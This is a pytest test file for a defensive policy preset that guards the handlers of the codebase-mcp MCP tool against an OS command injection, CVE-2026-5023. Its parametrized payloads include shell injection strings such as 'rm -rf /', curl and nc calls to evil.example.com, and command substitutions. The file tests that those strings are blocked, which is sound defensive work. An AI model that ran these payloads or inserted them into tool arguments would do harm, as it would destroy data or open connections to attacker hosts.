"""Tests for CVE-2026-5023 codebase-mcp RepoMix OS command injection (v0.5.5+).

Primary source (cited per v0.5.1+ convention):
- <https://www.sentinelone.com/vulnerability-database/cve-2026-5023/>
  (unpatched upstream as of 2026-04-24).

The package ``codebase-mcp`` wrapped the RepoMix CLI and shelled out
with user-controlled paths across four handlers. This preset refuses
to run those handlers unless the caller explicitly opts into
subprocess spawning AND every argument is free of shell metacharacters.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agent_airlock.policy_presets import (
    CodebaseMcpInjectionBlocked,
    codebase_mcp_cve_2026_5023_defaults,
)

FIXTURE = Path(__file__).parent / "fixtures" / "cve_2026_5023_codebase_mcp.json"


class TestCleanBaseline:
    """A non-codebase-mcp tool and a clean codebase-mcp call both pass."""

    def test_unrelated_tool_is_ignored(self) -> None:
        cfg = codebase_mcp_cve_2026_5023_defaults()
        # No raise — the preset only triggers on matching names
        cfg["check"]("readFile", ["./config.yaml"], allow_subprocess=False)

    def test_matching_tool_with_opt_in_and_clean_arg(self) -> None:
        cfg = codebase_mcp_cve_2026_5023_defaults()
        cfg["check"](
            "getCodebase",
            ["/tmp/safe/path"],
            allow_subprocess=True,
        )


class TestShellMetacharRejection:
    """Shell metacharacters in arguments are the CVE-2026-5023 tell."""

    @pytest.mark.parametrize(
        "payload",
        [
            "/tmp/foo; rm -rf /",
            "/tmp/bar && curl evil.example.com",
            "/tmp/baz | nc evil.example.com 1337",
            "/tmp/`id`",
            "/tmp/$(whoami)",
            "/tmp/a>b",
        ],
    )
    def test_shell_injection_is_blocked(self, payload: str) -> None:
        cfg = codebase_mcp_cve_2026_5023_defaults()
        with pytest.raises(CodebaseMcpInjectionBlocked):
            cfg["check"](
                "saveRemoteCodebase",
                [payload],
                allow_subprocess=True,
            )


class TestOptInRequirement:
    """Without ``allow_subprocess=True``, the four handlers are categorically denied."""

    @pytest.mark.parametrize(
        "tool_name",
        ["getCodebase", "getRemoteCodebase", "saveCodebase", "saveRemoteCodebase"],
    )
    def test_default_denies_all_four_handlers(self, tool_name: str) -> None:
        cfg = codebase_mcp_cve_2026_5023_defaults()
        with pytest.raises(CodebaseMcpInjectionBlocked, match="must be opted"):
            cfg["check"](tool_name, ["/tmp/anything"], allow_subprocess=False)


class TestPresetRoundTrip:
    """Preset exports stable contract."""

    def test_preset_exposes_expected_keys(self) -> None:
        cfg = codebase_mcp_cve_2026_5023_defaults()
        assert callable(cfg["check"])
        assert isinstance(cfg["tool_name_pattern"], str)
        assert isinstance(cfg["metachars"], tuple)
        assert cfg["source"].startswith("https://")


class TestFixture:
    """The fixture file stays in sync with the four tool names."""

    def test_fixture_enumerates_four_handlers(self) -> None:
        data = json.loads(FIXTURE.read_text(encoding="utf-8"))
        assert data["cve"] == "CVE-2026-5023"
        assert len(data["tool_names"]) == 4
        # The regex in the preset must match every fixture tool name
        cfg = codebase_mcp_cve_2026_5023_defaults()
        import re as _re

        pattern = _re.compile(cfg["tool_name_pattern"])
        for tool_name in data["tool_names"]:
            assert pattern.match(tool_name), (
                f"Preset regex {cfg['tool_name_pattern']!r} does not cover "
                f"fixture tool name {tool_name!r}"
            )
